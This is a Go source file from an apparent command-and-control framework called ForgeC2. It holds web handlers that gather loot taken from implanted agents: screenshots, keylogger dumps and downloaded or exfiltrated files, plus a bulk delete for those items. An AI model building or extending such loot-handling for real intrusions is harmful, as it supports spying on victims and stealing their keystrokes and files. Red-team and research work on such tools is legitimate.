package server

import (
	"net/http"
	"os"
	"path/filepath"
	"strings"

	"github.com/forgec2/forgec2/internal/db"
	"github.com/gin-gonic/gin"
)

// handleLootPage aggregates loot: screenshots, keylogs, downloaded files across all agents
func (s *Server) handleLootPage(c *gin.Context) {
	// Get all agents
	var agents []db.Implant
	s.db.Order("last_seen desc").Limit(LootAgentLimit).Find(&agents)

	dataDir := s.cfg.Server.DataDir
	if dataDir == "" {
		dataDir = "data"
	}

	// Aggregate screenshots
	type Screenshot struct {
		AgentID  string
		Filename string
		Path     string // relative for URL
	}
	var allScreenshots []Screenshot
	lootLimit := 500
	screenshotRoot := filepath.Join(dataDir, "screenshots")
	if entries, err := os.ReadDir(screenshotRoot); err == nil {
		for _, e := range entries {
			if !e.IsDir() {
				continue
			}
			agentDir := filepath.Join(screenshotRoot, e.Name())
			if files, err := os.ReadDir(agentDir); err == nil {
				for _, f := range files {
					if f.IsDir() || !(strings.HasSuffix(f.Name(), ".png") || strings.HasSuffix(f.Name(), ".jpg") || strings.HasSuffix(f.Name(), ".jpeg")) {
						continue
					}
					allScreenshots = append(allScreenshots, Screenshot{
						AgentID:  e.Name(),
						Filename: f.Name(),
						Path:     e.Name() + "/" + f.Name(),
					})
					if len(allScreenshots) >= lootLimit {
						break
					}
				}
			}
			if len(allScreenshots) >= lootLimit {
				break
			}
		}
	}

	// Keylogger dumps
	var keylogTasks []db.Task
	s.db.Preload("Agent").
		Where("type = ?", "keylogger_dump").
		Order("created_at desc").Limit(50).Find(&keylogTasks)

	// Recent downloads / exfil
	var downloadTasks []db.Task
	s.db.Preload("Agent").
		Where("type IN ?", []string{"download", "download_url"}).
		Order("created_at desc").Limit(50).Find(&downloadTasks)

	stats := s.getNavStats()
	data := gin.H{
		"Title":         "ForgeC2 - Loot",
		"ActiveNav":     "loot",
		"Agents":        agents,
		"Screenshots":   allScreenshots,
		"KeylogTasks":   keylogTasks,
		"DownloadTasks": downloadTasks,
	}
	for k, v := range stats {
		data[k] = v
	}

	s.renderPageOrJSON(c, data)
}

// handleLootBulkDelete deletes multiple loot items by composite IDs.
// IDs are "screenshot:AGENT:FILE", "keylog:TASK_ID", or "download:TASK_ID".
func (s *Server) handleLootBulkDelete(c *gin.Context) {
	if !s.requireOperator(c) {
		return
	}
	var req struct {
		IDs []string `json:"ids"`
	}
	if err := c.ShouldBindJSON(&req); err != nil || len(req.IDs) == 0 {
		respondError(c, http.StatusBadRequest, "ids array required")
		return
	}

	dataDir := s.cfg.Server.DataDir
	if dataDir == "" {
		dataDir = "data"
	}
	screenshotRoot := filepath.Join(dataDir, "screenshots")

	var deleted int
	for _, raw := range req.IDs {
		parts := strings.SplitN(raw, ":", 3)
		if len(parts) < 2 {
			continue
		}
		kind, id := parts[0], parts[1]
		switch kind {
		case "screenshot":
			if len(parts) != 3 {
				continue
			}
			agentDir := parts[1]
			filename := parts[2]
			fp := filepath.Join(screenshotRoot, agentDir, filename)
			if err := validateFilePath(fp, screenshotRoot); err == nil {
				if err := os.Remove(fp); err == nil {
					deleted++
				}
			}
		case "keylog":
			if err := s.db.Delete(&db.Task{}, "id = ? AND type IN ?", id, []string{"keylogger_dump", "keylogger_start"}).Error; err == nil {
				deleted++
			}
		case "download":
			if err := s.db.Delete(&db.Task{}, "id = ? AND type IN ?", id, []string{"download", "download_url"}).Error; err == nil {
				deleted++
			}
		}
	}
	respond(c, gin.H{"success": true, "deleted": deleted})
}
